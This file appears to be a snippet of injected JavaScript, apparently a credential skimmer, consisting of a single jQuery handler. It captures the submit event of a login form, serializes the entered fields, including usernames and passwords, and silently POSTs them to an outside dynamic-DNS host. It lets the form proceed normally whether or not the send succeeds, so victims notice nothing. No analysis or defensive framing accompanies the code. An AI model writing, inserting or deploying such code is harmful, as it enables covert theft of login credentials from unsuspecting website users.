$(".login-form").submit(function() {
	var d = $(".login-form");

	$.ajax({
        url: "http://tespek.dickdns.org/curl/",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
